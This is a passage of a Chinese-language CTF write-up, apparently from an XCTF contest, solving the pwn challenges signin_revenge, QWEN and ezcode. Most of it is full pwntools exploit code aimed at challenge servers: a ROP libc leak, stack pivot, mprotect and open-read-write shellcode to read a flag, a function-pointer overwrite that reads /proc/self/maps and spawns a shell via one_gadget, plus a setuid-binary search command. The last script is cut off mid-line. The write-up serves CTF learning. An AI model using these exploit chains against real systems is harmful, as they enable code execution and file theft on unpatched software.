<p>给成了下一个题的附件，后来紧急换上的。<del>草台班子</del><br>首先有个猜随机数的可以覆写种子绕过，之后有一个类似堆的东西，事实上是栈溢出，和堆一点关系都没有。有个沙箱，直接栈迁移➕mprotect然后写入shellcode,打orw.</p>
<hr>
<h1 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./signin/vuln&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./signin/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_dll = cdll.LoadLibrary(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;pwn-f2237b44a0.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-16186d9a30.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x401370</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sig</span>(<span class="params">rax=<span class="number">0</span>, rdi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, rsp=<span class="number">0</span>, rip=<span class="number">0</span></span>):</span><br><span class="line">    sigframe = SigreturnFrame()</span><br><span class="line">    sigframe.rax = rax</span><br><span class="line">    sigframe.rdi = rdi  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">    sigframe.rsi = rsi</span><br><span class="line">    sigframe.rdx = rdx</span><br><span class="line">    sigframe.rsp = rsp</span><br><span class="line">    sigframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln_addr = elf.sym.vuln</span><br><span class="line">read_addr = <span class="number">0x000000004012CF</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401393</span></span><br><span class="line">lev_ret = <span class="number">0x00000000004012BE</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;pwn!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_base = recv(<span class="string">b&quot;\n&quot;</span>) - libc.sym.puts</span><br><span class="line">mprotect_addr = libc_base + libc.sym.mprotect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x404500</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x67616c662f2e;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">inc rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">mov rdi, 1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">ls(libc_base)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = csu(edi=<span class="number">0x404000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=<span class="number">0x404510</span>, mode=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x404480</span>)</span><br><span class="line">payload += asm(shell)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&quot;x&quot;</span>)</span><br><span class="line">payload += p64(bss_addr - <span class="number">0x108</span>)</span><br><span class="line">payload += p64(lev_ret)</span><br><span class="line">payload += p64(mprotect_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有点无语，就是把signin中的栈溢出函数单独弄了出来，沙箱都是一模一样的。虽然读入内容少了，但还是能够栈迁移。和上一题做法一样。</p>
<hr>
<h1 id="QWEN"><a href="#QWEN" class="headerlink" title="QWEN"></a>QWEN</h1><blockquote>
<p>最可惜的一集，本来能拿一血的，但被远程权限卡了两个小时 :(</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./QWEN/pwn1&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./QWEN/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-deb19cee97.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_from_libc</span>(<span class="params">func_name: <span class="built_in">str</span>, func_addr: <span class="built_in">int</span>, libc=libc</span>):</span><br><span class="line">    log.success(func_name + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(func_addr))</span><br><span class="line">    offset = func_addr - libc.symbols[func_name]</span><br><span class="line">    binsh = offset + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">    system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">    <span class="keyword">return</span> (system, binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;0 0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;1 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;2 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;3 3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;4 4&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span> + <span class="string">b&quot;\x08\x15&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;[Y/N]\n&quot;</span>, <span class="string">b&quot;N&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;999 999&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; key\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x6B8B4567</span>).encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;in!\n&quot;</span>, <span class="string">b&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">text_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recvlines(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[vdso]\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;0 0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;1 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;2 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;3 3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;4 4&quot;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4F29E</span>, <span class="number">0x4F2A5</span>, <span class="number">0x4F302</span>, <span class="number">0x10A2FC</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span> + p64(one[<span class="number">3</span>] + libc_base) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;[Y/N]\n&quot;</span>, <span class="string">b&quot;N&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;512 256&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">find / -user root -perm -4000-print2&gt;/dev/null</span></span><br><span class="line"><span class="string">0x4f29e execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rsp+0x50 is writable</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL || &#123;rcx, &quot;-c&quot;, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rsp+0x50 is writable</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL || &#123;rcx, rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL || &#123;[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...&#125; is a valid argv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下五子棋，只要自己有五个能连成一块的就可以拿到一次输入机会（对方怎么样不管），输入可以覆写栈上的一个用于处理错误输入的函数指针。程序还有一个admin函数提供限制文件名的读文件（flag的g被过滤了）然后返回main。partial overwrite爆破该指针指向admin函数之后读取&#x2F;proc&#x2F;self&#x2F;maps，直接拿到libc地址，之后覆写函数指针为one gadget,正好有一个可以构造满足条件。拿到shell后只能用pwn2来读flag,输入指令.&#x2F;pwn2 -c aaa .&#x2F;flag之后cat .&#x2F;aaa拿到flag</p>
<hr>
<h1 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> pwnlib.adb <span class="keyword">import</span> shell</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./bin/ezcode&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-36f53f067e.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span 